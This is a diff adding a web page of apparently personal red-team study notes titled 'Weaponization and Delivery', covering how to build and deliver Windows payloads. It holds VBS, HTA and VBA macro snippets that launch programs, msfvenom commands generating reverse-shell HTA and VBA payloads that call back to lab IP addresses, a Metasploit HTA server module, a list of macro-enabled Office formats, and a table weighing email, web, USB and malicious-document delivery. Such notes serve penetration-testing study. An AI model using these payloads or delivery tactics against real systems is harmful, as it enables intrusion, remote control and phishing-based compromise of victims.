@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Weaponization</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Weaponization and Delivery</h1>
+                <p class="alert">Developing deliverable payloads.</p>
+                <strong>Last updated: May 4th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h3>WSH</h3>
+                    <div>
+                      <pre><code class="language-powershell">#Executing exe within vbs file
+Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True</code></pre>
+                    </div>
+                    <h3>HTA</h3>
+                    <div>
+                      <h4>Simple</h4>
+                      <div>
+                        <pre><code class="language-html">&lt;html&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      var c= &#039;cmd.exe&#039;
+      new ActiveXObject(&#039;WScript.Shell&#039;).Run(c);
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+                      </div>
+                      <h4>Metasploit</h4>
+                      <div>
+                        <pre><code class="language-bash">#reverse shell 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o shell.hta
+
+#or
+
+msf6 > use exploit/windows/misc/hta_server
+              </code></pre>
+                      </div>
+                    </div>
+                    <h3>VBA</h3>
+                    <div>
+                      <h4>Office</h4>
+                      <div>
+                        <p>To make the macro work, we need to save it in Macro-Enabled format such as:</p>
+                        <ul>
+                          <li>Word</li>
+                          <ul>
+                            <li>.dot</li>
+                            <li>.dotm</li>
+                            <li>.docm</li>
+                          </ul>
+                          <li>PowerPoint</li>
+                          <ul>
+                            <li>.pptm</li>
+                            <li>.potm</li>
+                            <li>.ppsm</li>
+                            <li>.ppam</li>
+                            <li>.ppa</li>
+                          </ul>
+                          <li>Excel</li>
+                          <ul>
+                            <li>.xls</li>
+                            <li>.xlt</li>
+                            <li>.xlsb</li>
+                            <li>.xlsm</li>
+                            <li>.xltm</li>
+                            <li>.xlam</li>
+                          </ul>
+                        </ul>
+                        <h4>The Macro:</h4> 
+                        <div>
+                          <pre><code class="language-bash">Sub PoC()
+  Dim payload As String
+  payload = "calc.exe"
+  CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+#or
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</code></pre>
+                        </div>
+                      </div>
+                    </div>
+                    <h3>Main Delivery Methods</h3>
+                    <div>
+                      <table>
+                        <thead>
+                          <tr>
+                            <th>Delivery Method</th>
+                            <th>Description</th>
+                            <th>Advantages</th>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          <tr>
+                            <td>Email</td>
+                            <td>Weaponized scripts are delivered through malicious email attachments or links.</td>
+                            <td>
+                              <ul>
+                                <li>Wide reach as emails can be sent to multiple recipients.</li>
+                                <li>Social engineering techniques can be used to entice recipients to open attachments or click on links.</li>
+                              </ul>
+                            </td>
+                          </tr>
+                          <tr>
+                           <td>Web</td>
+                           <td>Weaponized scripts are hosted on a compromised or malicious website.</td>
+                           <td>
+                           <ul>
+                             <li>Easy to distribute the URL to potential targets.</li>
+                             <li>Can leverage vulnerable websites or web applications to deliver the script.</li>
+                              </ul>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td>USB</td>
+                            <td>Weaponized scripts are placed on a USB drive and physically delivered or left in a targeted location.</td>
+                            <td>
+                              <ul>
+                                <li>Requires physical access, which can be advantageous when targeting specific individuals or organizations.</li>
+                                <li>Opportunities to exploit human curiosity or trust, such as leaving USB drives in public areas or during social events.</li>
+                              </ul>
+                            </td>
+                          </tr>
+                          <tr>
+                            <td>Malicious Document</td>
+                            <td>Weaponized scripts are embedded within seemingly harmless documents (e.g., Word, Excel, PDF).</td>
+                            <td>
+                              <ul>
+                                <li>Exploits trust in commonly used file formats, increasing the chances of successful execution.</li>
+                                <li>Can leverage vulnerabilities in document readers or viewers to execute the script.</li>
+                              </ul>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </div>
+                  </div>
+                </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+    </div>
+    <script src=
+    "https://eli2k.com/resources/js/themeSwitch.js"></script>
+    <script src=
+    "https://eli2k.com/resources/js/collapseList.js"></script>
+    
+  </div>
+</body>
+</html>
